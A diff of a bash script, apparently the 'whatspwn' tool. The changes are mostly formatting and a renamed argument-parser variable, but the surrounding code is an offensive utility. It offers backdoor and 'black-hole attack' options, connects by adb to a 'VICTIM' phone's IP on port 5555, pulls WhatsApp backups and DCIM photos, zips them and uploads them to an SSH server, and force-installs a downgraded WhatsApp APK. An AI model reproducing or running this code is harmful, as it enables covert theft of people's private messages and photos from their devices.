@@ -25,6 +25,7 @@ BOLD='\033[1m'
 RED='\033[0;31m'
 GREEN='\033[0;32m'
 CYAN='\033[0;36m'
+
 #Beginning of function definitions
 # -i option of backdoor prompt and variable definition
 BACKDOORMENU(){
@@ -172,11 +173,11 @@ MAIN(){
 	fi
 }
 
-
 BLACKHOLEMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}DO YOU WANT TO USE BLACK-HOLE ATTACK?${CYAN}${NONE}[Y|N]:"
 	read BLACKHOLE
 }
+
 B2NBH(){
 	if [[ -z "$BLACKHOLE" ]]; then
 		BLACKHOLEMENU
@@ -192,6 +193,7 @@ B2NBH(){
 		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && BHR ;;
 	esac
 }
+
 OUTPUTFILEBAK(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}FILENAME FOR BAK [DEFAULT=filesystem_linux]${NONE}:"
 	read BACKUPZIPNAME
@@ -200,6 +202,7 @@ OUTPUTFILEBAK(){
 		echo "[DEFAULT]:${BACKUPZIPNAME}"
 	fi
 }
+
 B2NBHNDB(){
 	if [[ -z "$BLACKHOLE" ]]; then
 		BLACKHOLEMENU
@@ -215,6 +218,7 @@ B2NBHNDB(){
 		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && BHR ;;
 	esac
 }
+
 WHATSUSED(){
 	if [ ! -f ${PATHEXT}extracted/${NAME}/WhatsApp/backup_file.ab ]; then
 		UPCNDB
@@ -227,10 +231,12 @@ WHATSUSED(){
 		fi
 	fi
 }
+
 UPLOADYNMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}UPLOAD TO SERVER?${CYAN}${NONE}[Y|N]:"
 	read UPLOADYN
 }
+
 UPC(){
 	if [[ -z "$UPLOADYN" ]]; then
 		UPLOADYNMENU
@@ -257,6 +263,7 @@ UPC(){
 		*) NAUTILUS ;;
 	esac
 }
+
 NAUTILUS(){
 	if ! type nautilus > /dev/null; then
 		if [[ $USEINTERFACE == "Y" ]]; then
@@ -273,6 +280,7 @@ NAUTILUS(){
 		fi
 	fi
 }
+
 UPCNDB(){
 	if [[ -z "$UPLOADYN" ]]; then
 		if [[ $USEINTERFACE == "Y" ]]; then
@@ -296,9 +304,11 @@ UPCNDB(){
 		*) NAUTILUS ;;
 	esac
 }
+
 BHR(){
 	BHRMANUAL
 }
+
 BHL(){
 	if [[ -z "$NAME" ]]; then
 		VICTIM
@@ -307,13 +317,16 @@ BHL(){
 		EXTRACTION
 	fi
 }
+
 BACKUPZIP(){
 	zip -u -r -q -9 ${PATHEXT}${BACKUPZIPNAME} ${PATHEXT}extracted/ > /dev/null
 }
+
 DCIMMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${BOLD}INCLUDE DCIM PHOTOS? (MAY TAKE A LONG TIME)${CYAN}${NONE}[Y|N]:"
 	read DCIM
 }
+
 EXTRACTION(){
 	if [[ -z "$DCIM" ]]; then
 		if [[ $USEINTERFACE == "Y" ]]; then
@@ -344,6 +357,7 @@ EXTRACTION(){
 		*) echo -e "${RED}YOUR ANSWER IS NOT VALID${NONE}...TAKING IT AS A YES" && echo -e "${BOLD}EXTRACTING DCIM PHOTOS ... ${GREEN}[OK]${NONE}" && mkdir -p ${PATHEXT}extracted/${NAME}/DCIM && bin/adb pull "/sdcard/DCIM" ${PATHEXT}extracted/${NAME}/DCIM && WHATSUSED ;;
 	esac
 }
+
 EXITCODE(){
 	rm -f tmp/filesizebackdoor.txt & > /dev/null &
 	rm -f tmp/version.txt & > /dev/null &
@@ -353,6 +367,7 @@ EXITCODE(){
 	rm -rf ${PATHEXT}extracted/${NAME}/apps & > /dev/null &
 	exit
 }
+
 BHRMANUAL(){
 	if [[ -z "$NAME" ]]; then
 		VICTIM
@@ -368,6 +383,7 @@ BHRMANUAL(){
 			CONNECTMANUAL
 	fi
 }
+
 CONNECTION(){
 	if bin/adb connect ${ipAddrOverride}:5555 | grep "connected to ${ipAddrOverride}" -oE; then
 		sleep 2
@@ -383,6 +399,7 @@ CONNECTION(){
 		CONNECTMANUAL
 	fi
 }
+
 CONNECTMANUAL(){
 	if bin/adb devices | grep "[0-9]{1,3}(\.[0-9]{1,3}){3}" -oE; then
 		EXTRACTION
@@ -393,6 +410,7 @@ CONNECTMANUAL(){
 		CONNECTION
 	fi
 }
+
 SHELL(){
 	bin/adb start-server > /dev/null
 	bin/adb devices > adbdevices.txt
@@ -448,10 +466,12 @@ SHELL(){
 	fi
 	rm -f adbdevices.txt
 }
+
 SSHPASSMENU(){
 	echo -e -n "\n${CYAN}WAP${NONE}>${CYAN}ENTER YOUR SSH SERVER PASSWORD${NONE}:"
 	read -s SSHPASS
 }
+
 CMND(){
 	. ./server
 	if service ssh status | grep "not running" -oE > /dev/null; then
@@ -465,6 +485,7 @@ CMND(){
 		fi
 	fi
 }
+
 UPLOAD(){
 	if [[ ! -d ${PATHEXT}extracted ]]; then
 		if [[ ! -f ${PATHEXT}${BACKUPZIPNAME}.zip ]]; then
@@ -495,6 +516,7 @@ UPLOAD(){
 			exit 0
 		fi
 }
+
 IFAUTOMODEONWPR(){
 	if cat "config" | grep 'AUTOMODE="1"' -oE; then
 		BACKDOORMENU
@@ -510,6 +532,7 @@ IFAUTOMODEONWPR(){
 		esac
 	fi
 }
+
 IFAUTOMODEONJB(){
 	if cat "config" | grep 'AUTOMODE="1"' -oE; then
 		VICTIM
@@ -521,6 +544,7 @@ IFAUTOMODEONJB(){
 		esac
 	fi
 }
+
 #Main interface if -i option
 INTERFACE(){
 	clear
@@ -580,12 +604,14 @@ INTERFACE(){
 		*) echo -e "${RED}THAT IS NOT A VALID OPTION...TRY AGAIN${NONE}" && INTERFACE ;;
 	esac
 }
+
 USAGE(){
 	echo -e "${RED}SYNTAX ERROR${NONE}"
 	cat bin/help.txt
 	cd ${HOME}
 }
 #End of function definitions
+
 #Enable cleanly exit with ctrl+c
 trap 'EXITCODE' SIGHUP SIGINT SIGTERM SIGQUIT
 clear
@@ -607,13 +633,13 @@ echo "alias whatspwn='${WDIR}/whatspwn'" >> ${HOME}/.bash_aliases
 cd ${WDIR} && . ./config
 #Argument Parser
 if [[ $# > 0 ]]; then
-	key="$1"
-	case "$key" in
-		FULL|1) if [[ $# > 1 ]]; then
+	option="$1"
+	case "$option" in
+		FULL|1|full) if [[ $# > 1 ]]; then
 					shift
 					while [[ $# > 0 ]]; do
-						key="$1"
-						case "$key" in
+						option="$1"
+						case "$option" in
 							-b|--use-backdoor|--backdoor) BACKDOOR="Y" && shift ;;
 							-e|--black-hole|--use-black-hole) BLACKHOLE="Y" && shift ;;
 							-v|--victim) NAME="$2" && shift 2 ;;
@@ -626,15 +652,15 @@ if [[ $# > 0 ]]; then
 						esac
 					done
 				fi && WHATSPWNREMOTE ;;
-		RELAUNCH|2) BD2 && cd ${HOME};;
-		SHELL|3) SHELL && cd ${HOME};;
-		RESTORE|4) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
+		RELAUNCH|2|relaunch) BD2 && cd ${HOME};;
+		SHELL|3|shell) SHELL && cd ${HOME};;
+		RESTORE|4|restore) bin/adb wait-for-device && bin/adb install -r -d bin/WhatsApp_Backup.apk && cd ${HOME} ;;
 		EXTRACTION|5|extraction) if [[ $2 == "local" ]]; then
 									if [[ $# > 2 ]]; then
 										shift 2
 										while [[ $# > 0 ]]; do
-											key="$1"
-											case "$key" in
+											option="$1"
+											case "$option" in
 												-v|--victim) NAME="$2" && shift 2 ;;
 												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
 												-k|--backup) BACKUPZIPNAME="$2" && shift 2 ;;
@@ -653,8 +679,8 @@ if [[ $# > 0 ]]; then
 								 	if [[ $# > 2 ]]; then
 										shift 2
 										while [[ $# > 0 ]]; do
-											key="$1"
-											case "$key" in
+											option="$1"
+											case "$option" in
 												-v|--victim) NAME="$2" && shift ;;
 												-d|--DCIM|--dcim) DCIM="Y" && shift ;;
 												-k|--backup) BACKUPZIPNAME="$2" && shift ;;
